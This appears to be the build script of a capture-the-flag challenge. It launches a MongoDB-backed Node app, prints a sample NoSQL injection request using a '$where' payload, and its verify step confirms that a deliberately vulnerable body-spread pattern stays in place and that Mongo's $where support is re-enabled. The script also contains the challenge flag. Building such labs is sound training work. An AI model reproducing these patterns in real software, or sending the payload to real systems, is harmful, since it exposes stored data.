#!/bin/sh
# build.sh — orchestrate smugglers_manifest via docker compose.
#
# Usage:
#   bash build/build.sh up        # build + start (mongo + seed + app)
#   bash build/build.sh down      # stop and remove
#   bash build/build.sh logs      # tail app logs
#   bash build/build.sh verify    # static checks (no docker)

set -eu

ISLAND_DIR="$(cd "$(dirname "$0")/.." && pwd)"
SRC_DIR="$ISLAND_DIR/src"
BUILD_DIR="$ISLAND_DIR/build"
COMPOSE_FILE="$BUILD_DIR/docker-compose.yml"

case "${1:-up}" in
  up)
    docker compose -f "$COMPOSE_FILE" up --build -d
    sleep 6
    docker compose -f "$COMPOSE_FILE" ps
    echo
    echo "[build] try the intended NoSQL injection:"
    echo '  curl -sS -X POST http://localhost:8080/api/cargo/search \'
    echo '    -H "Content-Type: application/json" \'
    echo '    -d ''{"$where": "this.hidden==true"}'''
    ;;
  down)
    docker compose -f "$COMPOSE_FILE" down -v
    ;;
  logs)
    docker compose -f "$COMPOSE_FILE" logs -f app
    ;;
  verify)
    echo "[verify] checking source files exist..."
    test -f "$SRC_DIR/app.js"        || { echo "MISSING app.js"; exit 1; }
    test -f "$SRC_DIR/seed.js"       || { echo "MISSING seed.js"; exit 1; }
    test -f "$SRC_DIR/package.json"  || { echo "MISSING package.json"; exit 1; }
    test -f "$SRC_DIR/Dockerfile"    || { echo "MISSING Dockerfile"; exit 1; }
    test -f "$COMPOSE_FILE"          || { echo "MISSING docker-compose.yml"; exit 1; }
    echo "[verify] checking the flag is in seed.js (default FLAG env)..."
    if ! grep -q "progctf{calderwoods_dollar_sign_problem}" "$SRC_DIR/seed.js"; then
      echo "FAIL: flag string missing from seed.js" >&2
      exit 1
    fi
    echo "[verify] checking the flag is NOT in app.js..."
    if grep -q "progctf{" "$SRC_DIR/app.js"; then
      echo "FAIL: flag leaks into app.js (it should only be in the seeded mongo doc)" >&2
      exit 1
    fi
    echo "[verify] checking the vulnerable POST endpoint sets default BEFORE body spread (so body overrides)..."
    if ! grep -F '{ hidden: false, ...body }' "$SRC_DIR/app.js" >/dev/null; then
      echo "FAIL: vulnerable spread pattern not present in /api/cargo/search POST handler" >&2
      exit 1
    fi
    echo "[verify] checking docker-compose enables Mongo \$where (javascriptEnabled=true)..."
    if ! grep -q "javascriptEnabled=true" "$COMPOSE_FILE"; then
      echo "FAIL: mongo container does not re-enable \$where" >&2
      exit 1
    fi
    echo "[verify] OK — static checks pass"
    ;;
  *)
    echo "usage: $0 {up|down|logs|verify}" >&2
    exit 2
    ;;
esac
